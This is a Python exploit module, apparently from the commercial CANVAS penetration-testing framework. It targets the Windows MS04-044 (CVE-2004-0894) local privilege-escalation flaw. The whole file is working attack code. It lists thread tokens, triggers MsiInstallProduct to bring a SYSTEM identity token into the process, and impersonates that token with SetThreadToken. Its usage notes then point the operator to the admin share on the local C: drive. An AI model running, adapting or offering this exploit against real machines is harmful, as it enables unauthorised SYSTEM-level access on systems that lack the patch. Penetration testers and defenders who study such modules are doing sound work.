#! /usr/bin/env python



#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2004
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")


import os,getopt
import socket
from exploitutils import *
import addencoder
import win32shell
from canvasexploit import canvasexploit

from ExploitTypes.localexploit import LocalExploit
import canvasengine
from canvasengine import socket_save_list
import time
import shellcodeGenerator


NAME="msimpersonate (MS04-044)"
DESCRIPTION="Enables an identity token and setthreadtokens it"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION["MSRC"]="http://www.microsoft.com/technet/security/bulletin/MS04-044.mspx"
DOCUMENTATION["Discovered By"]="Cesar Cerrudo"
DOCUMENTATION["Usage"]="""Will attempt to load a system token - use 
getthreadsinfo to determine if this works.
Then you should be able to change into \\\\127.0.0.1\\C$, etc
Sometimes it's hard to tell which token is the system token...
"""
DOCUMENTATION["CVE Name"] = "CVE-2004-0894"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0894"
DOCUMENTATION['CVSS'] = 7.2

VERSION="1.0"
GTK2_DIALOG="dialog.glade2"

PROPERTY = {}
PROPERTY["TYPE"]= "Exploit"
PROPERTY["SITE"]=  "Local"
PROPERTY["ARCH"]= [ ["Windows"] ]
PROPERTY["MSADV"]="MS04-044"

runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit


class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.result=""
        self.name=NAME
    
    def run(self):
        self.setInfo("%s (in progress)"%(NAME))
        ret=0
        self.node=self.argsDict["passednodes"][0]
        if "win32api" in self.node.capabilities:

            #this call will get the SYSTEM Identity token

            app=self.engine.getModuleExploit("getthreadsinfo")
            app.link(self)
            app.run()
            self.log("Tokens in process: %s"%app.result)
            saved=app.result[:]
            self.node.shell.MsiInstallProduct("","") 
            app.run()
            self.log("Tokens in process: %s"%app.result)
            for r in app.result:
                if r not in saved:
                    self.log("Setting token to new token: %s"%str(r))
                    self.node.shell.SetThreadToken(r[0])
            self.log("If all went well, you are now running as a SYSTEM identity token")
            self.log("The next step is to cd \\localhost\\C$ and see what's up")
            ret=1
        else:
            self.log("%s node type not supported"%self.node.nodetype)
                
        self.result=ret
            
        self.setInfo("%s - done (success: %s)"%(NAME,self.result))
        return ret

